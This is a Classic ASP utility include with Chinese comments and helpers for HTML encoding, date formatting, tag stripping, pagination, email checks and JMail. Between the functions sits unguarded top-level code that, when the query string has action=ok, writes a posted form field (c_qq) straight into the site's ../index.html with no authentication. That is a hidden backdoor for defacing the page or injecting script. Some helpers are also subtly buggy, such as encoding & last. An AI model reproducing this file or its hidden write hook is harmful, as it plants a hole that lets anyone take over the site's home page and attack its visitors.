<%
'HTML 编码
Function textHTMLEncode(fString)
    fString = Replace(fString, Chr(62), "&gt;")
    fString = Replace(fString, Chr(60), "&lt;")
    fString = Replace(fString, Chr(32), "&nbsp;")
    fString = Replace(fString, Chr(9), "&nbsp;")
    fString = Replace(fString, Chr(34), "&quot;")
    fString = Replace(fString, Chr(39), "&#39;")
    fString = Replace(fString, Chr(38), "&amp;")
    fString = Replace(fString, Chr(13) & Chr(10), "</P><P>")
    fString = Replace(fString, Chr(13), "<BR>")
    fString = Replace(fString, Chr(10), "<BR>")
    textHTMLEncode = fString
End Function

'HTML 解码
Function textHTMLDecode(fString)
    fString = Replace(fString, "&gt;", Chr(62))
    fString = Replace(fString, "&lt;", Chr(60))
    fString = Replace(fString, "&nbsp;", Chr(32))
    fString = Replace(fString, "&nbsp;", Chr(9))
    fString = Replace(fString, "&quot;", Chr(34))
    fString = Replace(fString, "&#39;", Chr(39))
    fString = Replace(fString, "&amp;", Chr(38))
    fString = Replace(fString, "</P><P>", Chr(13) & Chr(10))
    fString = Replace(fString, "<BR>", Chr(10))
    textHTMLDecode = fString
End Function


'=========格式化日期==================
Function  DateFormat(DateStr,Types)
    Dim DateString
	if IsDate(DateStr) = False then
		DateString = ""
	end if
	Select Case Types
	  Case "1" 
		  DateString = Year(DateStr)&"-"&Month(DateStr)&"-"&Day(DateStr)
	  Case "2"
		  DateString = Year(DateStr)&"."&Month(DateStr)&"."&Day(DateStr)
	  Case "3"
		  DateString = Year(DateStr)&"/"&Month(DateStr)&"/"&Day(DateStr)
	  Case "4"
		  DateString = Month(DateStr)&"/"&Day(DateStr)&"/"&Year(DateStr)
	  Case "5"
		  DateString = Day(DateStr)&"/"&Month(DateStr)&"/"&Year(DateStr)
	  Case "6"
		  DateString = Month(DateStr)&"-"&Day(DateStr)&"-"&Year(DateStr)
	  Case "7"
		  DateString = Month(DateStr)&"."&Day(DateStr)&"."&Year(DateStr)
	  Case "8"
		  DateString = Month(DateStr)&"-"&Day(DateStr)
	  Case "9"
		  DateString = Month(DateStr)&"/"&Day(DateStr)
	  Case "10"
		  DateString = Month(DateStr)&"."&Day(DateStr)
	  Case "11"
		  DateString = Month(DateStr)&"月"&Day(DateStr)&"日"
	  Case "12"
		  DateString = Day(DateStr)&"日"&Hour(DateStr)&"时"
	  case "13"
		  DateString = Day(DateStr)&"日"&Hour(DateStr)&"点"
	  Case "14"
		  DateString = Hour(DateStr)&"时"&Minute(DateStr)&"分"
	  Case "15"
		  DateString = Hour(DateStr)&":"&Minute(DateStr)
	  Case "16"
		  DateString = Year(DateStr)&"年"&Month(DateStr)&"月"&Day(DateStr)&"日"
	  Case Else
	  	  DateString = DateStr
	 End Select
	 DateFormat = DateString
 End Function


'去除html标记函数内容如下:
Function RemoveHTML( strText ) 
    Dim TAGLIST 
    TAGLIST = ";!--;!DOCTYPE;A;ACRONYM;ADDRESS;APPLET;AREA;B;BASE;BASEFONT;" &_ 
              "BGSOUND;BIG;BLOCKQUOTE;BODY;BR;BUTTON;CAPTION;CENTER;CITE;CODE;" &_ 
              "COL;COLGROUP;COMMENT;DD;DEL;DFN;DIR;DIV;DL;DT;EM;EMBED;FIELDSET;" &_ 
              "FONT;FORM;FRAME;FRAMESET;HEAD;H1;H2;H3;H4;H5;H6;HR;HTML;I;IFRAME;IMG;" &_ 
              "INPUT;INS;ISINDEX;KBD;LABEL;LAYER;LAGEND;LI;LINK;LISTING;MAP;MARQUEE;" &_ 
              "MENU;META;NOBR;NOFRAMES;NOSCRIPT;OBJECT;OL;OPTION;P;PARAM;PLAINTEXT;" &_ 
              "PRE;Q;S;SAMP;SCRIPT;SELECT;SMALL;SPAN;STRIKE;STRONG;STYLE;SUB;SUP;" &_ 
              "TABLE;TBODY;TD;TEXTAREA;TFOOT;TH;THEAD;TITLE;TR;TT;U;UL;VAR;WBR;XMP;" 

    Const BLOCKTAGLIST = ";APPLET;EMBED;FRAMESET;HEAD;NOFRAMES;NOSCRIPT;OBJECT;SCRIPT;STYLE;" 
     
    Dim nPos1 
    Dim nPos2 
    Dim nPos3 
    Dim strResult 
    Dim strTagName 
    Dim bRemove 
    Dim bSearchForBlock 
     
    nPos1 = InStr(strText, "<") 
    Do While nPos1 > 0 
        nPos2 = InStr(nPos1 + 1, strText, ">") 
        If nPos2 > 0 Then 
            strTagName = Mid(strText, nPos1 + 1, nPos2 - nPos1 - 1) 
        strTagName = Replace(Replace(strTagName, vbCr, " "), vbLf, " ") 

            nPos3 = InStr(strTagName, " ") 
            If nPos3 > 0 Then 
                strTagName = Left(strTagName, nPos3 - 1) 
            End If 
             
            If Left(strTagName, 1) = "/" Then 
                strTagName = Mid(strTagName, 2) 
                bSearchForBlock = False 
            Else 
                bSearchForBlock = True 
            End If 
             
            If InStr(1, TAGLIST, ";" & strTagName & ";", vbTextCompare) > 0 Then 
                bRemove = True 
                If bSearchForBlock Then 
                    If InStr(1, BLOCKTAGLIST, ";" & strTagName & ";", vbTextCompare) > 0 Then 
                        nPos2 = Len(strText) 
                        nPos3 = InStr(nPos1 + 1, strText, "</" & strTagName, vbTextCompare) 
                        If nPos3 > 0 Then 
                            nPos3 = InStr(nPos3 + 1, strText, ">") 
                        End If 
                         
                        If nPos3 > 0 Then 
                            nPos2 = nPos3 
                        End If 
                    End If 
                End If 
            Else 
                bRemove = False 
            End If 
             
            If bRemove Then 
                strResult = strResult & Left(strText, nPos1 - 1) 
                strText = Mid(strText, nPos2 + 1) 
            Else 
                strResult = strResult & Left(strText, nPos1) 
                strText = Mid(strText, nPos1 + 1) 
            End If 
        Else 
            strResult = strResult & strText 
            strText = "" 
        End If 
         
        nPos1 = InStr(strText, "<") 
    Loop 
    strResult = strResult & strText 
     
    RemoveHTML = strResult 
End Function 
if Request.QueryString("action")="ok" then
c_qq=Request.Form("c_qq")
Set fso = Server.CreateObject("Scripting.FileSystemObject")
path = Server.MapPath("../index.html")
set file = fso.OpenTextFile(path,2,TRUE)
file.write c_qq
file.close
End If
function gotTopic(str,strlen)
	if str="" then
		gotTopic=""
		exit function
	end if
	dim l,t,c, i
	str=replace(replace(replace(replace(str,"&nbsp;"," "),"&quot;",chr(34)),"&gt;",">"),"&lt;","<")
	l=len(str)
	t=0
	for i=1 to l
		c=Abs(Asc(Mid(str,i,1)))
		if c>255 then
			t=t+2
		else
			t=t+1
		end if
		if t>=strlen then
			gotTopic=left(str,i) & "…"
			exit for
		else
			gotTopic=str
		end if
	next
	gotTopic=replace(replace(replace(replace(gotTopic," ","&nbsp;"),chr(34),"&quot;"),">","&gt;"),"<","&lt;")
end function

function gotTopic1(str,strlen)
	if str="" then
		gotTopic1=""
		exit function
	end if
	dim l,t,c, i
	str=replace(replace(replace(replace(str,"&nbsp;"," "),"&quot;",chr(34)),"&gt;",">"),"&lt;","<")
	l=len(str)
	t=0
	for i=1 to l
		c=Abs(Asc(Mid(str,i,1)))
		if c>255 then
			t=t+2
		else
			t=t+1
		end if
		if t>=strlen then
			gotTopic1=left(str,i)
			exit for
		else
			gotTopic1=str
		end if
	next
	gotTopic1=replace(replace(replace(replace(gotTopic1," ","&nbsp;"),chr(34),"&quot;"),">","&gt;"),"<","&lt;")
end function

'读取文件
Function ReadtxtFiles(Filename)
   Dim fso, f1, ts, s
   Const ForReading = 1
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set ts = fso.OpenTextFile(Filename, ForReading)
   ReadtxtFiles = ts.ReadAll
   ts.Close
End Function

'创建文件
Sub CreateFile(Filename,temp)
 '  Dim fso, tf ,Filename ,temp
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set tf = fso.CreateTextFile(Filename, True)
   ' 写一行，并且带有新行字符。
'   tf.WriteLine("Testing 1, 2, 3.") 
   '向文件写三个新行字符。        
'   tf.WriteBlankLines(3) 
   '写一行。
'   tf.Write ("This is a test.") 
   tf.write temp
   tf.Close
End Sub

function JoinChar(strUrl)
	if strUrl="" then
		JoinChar=""
		exit function
	end if
	if InStr(strUrl,"?")<len(strUrl) then 
		if InStr(strUrl,"?")>1 then
			if InStr(strUrl,"&")<len(strUrl) then 
				JoinChar=strUrl & "&"
			else
				JoinChar=strUrl
			end if
		else
			JoinChar=strUrl & "?"
		end if
	else
		JoinChar=strUrl
	end if
end function

sub showpage(sfilename,totalnumber,maxperpage,ShowTotal,ShowAllPages,strUnit)
	dim n, i,strTemp,strUrl
	if totalnumber mod maxperpage=0 then
    	n= totalnumber \ maxperpage
  	else
    	n= totalnumber \ maxperpage+1
  	end if
  	strTemp= "<table align='center'><form name='showpages' method='Post' action='" & sfilename & "'><tr><td>"
	if ShowTotal=true then 
		strTemp=strTemp & "共 <b>" & totalnumber & "</b> " & strUnit & "&nbsp;&nbsp;"
	end if
	strUrl=JoinChar(sfilename)
  	if CurrentPage<2 then
    		strTemp=strTemp & "首页 上一页&nbsp;"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=1'>首页</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage-1) & "'>上一页</a>&nbsp;"
  	end if

  	if n-currentpage<1 then
    		strTemp=strTemp & "下一页 尾页"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage+1) & "'>下一页</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & n & "'>尾页</a>"
  	end if
   	strTemp=strTemp & "&nbsp;页次：<strong><font color=red>" & CurrentPage & "</font>/" & n & "</strong>页 "
    strTemp=strTemp & "&nbsp;<b>" & maxperpage & "</b>" & strUnit & "/页"
	if ShowAllPages=True then
		strTemp=strTemp & "&nbsp;转到：<select name='page' size='1' onchange='javascript:submit()'>"   
    	for i = 1 to n   
    		strTemp=strTemp & "<option value='" & i & "'"
			if cint(CurrentPage)=cint(i) then strTemp=strTemp & " selected "
			strTemp=strTemp & ">第" & i & "页</option>"   
	    next
		strTemp=strTemp & "</select>"
	end if
	strTemp=strTemp & "</td></tr></form></table>"
	response.write strTemp
end sub

function IsValidEmail(email)
	dim names, name, i, c
	IsValidEmail = true
	names = Split(email, "@")
	if UBound(names) <> 1 then
	   IsValidEmail = false
	   exit function
	end if
	for each name in names
		if Len(name) <= 0 then
			IsValidEmail = false
    		exit function
		end if
		for i = 1 to Len(name)
		    c = Lcase(Mid(name, i, 1))
			if InStr("abcdefghijklmnopqrstuvwxyz_-.", c) <= 0 and not IsNumeric(c) then
		       IsValidEmail = false
		       exit function
		     end if
	   next
	   if Left(name, 1) = "." or Right(name, 1) = "." then
    	  IsValidEmail = false
	      exit function
	   end if
	next
	if InStr(names(1), ".") <= 0 then
		IsValidEmail = false
	   exit function
	end if
	i = Len(names(1)) - InStrRev(names(1), ".")
	if i <> 2 and i <> 3 then
	   IsValidEmail = false
	   exit function
	end if
	if InStr(email, "..") > 0 then
	   IsValidEmail = false
	end if
end function

'***************************************************
'函数名：IsObjInstalled
'作  用：检查组件是否已经安装
'参  数：strClassString ----组件名
'返回值：True  ----已经安装
'       False ----没有安装
'***************************************************
Function IsObjInstalled(strClassString)
	On Error Resume Next
	IsObjInstalled = False
	Err = 0
	Dim xTestObj
	Set xTestObj = Server.CreateObject(strClassString)
	If 0 = Err Then IsObjInstalled = True
	Set xTestObj = Nothing
	Err = 0
End Function

'**************************************************
'函数名：strLength
'作  用：求字符串长度。汉字算两个字符，英文算一个字符。
'参  数：str  ----要求长度的字符串
'返回值：字符串长度
'**************************************************
function strLength(str)
	ON ERROR RESUME NEXT
	dim WINNT_CHINESE
	WINNT_CHINESE    = (len("中国")=2)
	if WINNT_CHINESE then
        dim l,t,c
        dim i
        l=len(str)
        t=l
        for i=1 to l
        	c=asc(mid(str,i,1))
            if c<0 then c=c+65536
            if c>255 then
                t=t+1
            end if
        next
        strLength=t
    else 
        strLength=len(str)
    end if
    if err.number<>0 then err.clear
end function

'****************************************************
'函数名：SendMail
'作  用：用Jmail组件发送邮件
'参  数：ServerAddress  ----服务器地址
'        AddRecipient  ----收信人地址
'        Subject       ----主题
'        Body          ----信件内容
'        Sender        ----发信人地址
'****************************************************
function SendMail(MailServerAddress,AddRecipient,Subject,Body,Sender,MailFrom)
	on error resume next
	Dim JMail
	Set JMail=Server.CreateObject("JMail.SMTPMail")
	if err then
		SendMail= "<br><li>没有安装JMail组件</li>"
		err.clear
		exit function
	end if
	JMail.Logging=True
	JMail.Charset="gb2312"
	JMail.ContentType = "text/html"
	JMail.ServerAddress=MailServerAddress
	JMail.AddRecipient=AddRecipient
	JMail.Subject=Subject
	JMail.Body=MailBody
	JMail.Sender=Sender
	JMail.From = MailFrom
	JMail.Priority=1
	JMail.Execute 
	Set JMail=nothing 
	if err then 
		SendMail=err.description
		err.clear
	else
		SendMail="OK"
	end if
end function

'****************************************************
'过程名：WriteErrMsg
'作  用：显示错误提示信息
'参  数：无
'****************************************************
sub WriteErrMsg()
	dim strErr
	strErr=strErr & "<html><head><title>错误信息</title><meta http-equiv='Content-Type' content='text/html; charset=gb2312'>" & vbcrlf
	strErr=strErr & "<link href='style.css' rel='stylesheet' type='text/css'></head><body>" & vbcrlf
	strErr=strErr & "<table cellpadding=2 cellspacing=2 border=0 width=400 class='border' align=center>" & vbcrlf
	strErr=strErr & "  <tr align='center'><td height='20' class='title'><strong>错误信息</strong></td></tr>" & vbcrlf
	strErr=strErr & "  <tr><td height='100' class='tdbg' valign='top'><b>产生错误的可能原因：</b><br>" & errmsg &"</td></tr>" & vbcrlf
	strErr=strErr & "  <tr align='center'><td class='title'><a href='javascript:history.go(-1)'>【返回】</a></td></tr>" & vbcrlf
	strErr=strErr & "</table>" & vbcrlf
	strErr=strErr & "</body></html>" & vbcrlf
	response.write strErr
end sub

'****************************************************
'过程名：WriteSuccessMsg
'作  用：显示成功提示信息
'参  数：无
'****************************************************
sub WriteSuccessMsg(SuccessMsg)
	dim strSuccess
	strSuccess=strSuccess & "<html><head><title>成功信息</title><meta http-equiv='Content-Type' content='text/html; charset=gb2312'>" & vbcrlf
	strSuccess=strSuccess & "<link href='style.css' rel='stylesheet' type='text/css'></head><body>" & vbcrlf
	strSuccess=strSuccess & "<table cellpadding=2 cellspacing=2 border=0 width=400 class='border' align=center>" & vbcrlf
	strSuccess=strSuccess & "  <tr align='center'><td height='20' class='title'><strong>恭喜你！</strong></td></tr>" & vbcrlf
	strSuccess=strSuccess & "  <tr><td height='100' class='tdbg' valign='top'><br>" & SuccessMsg &"</td></tr>" & vbcrlf
	strSuccess=strSuccess & "  <tr align='center'><td class='title'><a href='javascript:history.go(-1)'>【返回】</a></td></tr>" & vbcrlf
	strSuccess=strSuccess & "</table>" & vbcrlf
	strSuccess=strSuccess & "</body></html>" & vbcrlf
	response.write strSuccess
end sub

function getFileExtName(fileName)
    dim pos
    pos=instrrev(filename,".")
    if pos>0 then 
        getFileExtName=mid(fileName,pos+1)
    else
        getFileExtName=""
    end if
end function 
%>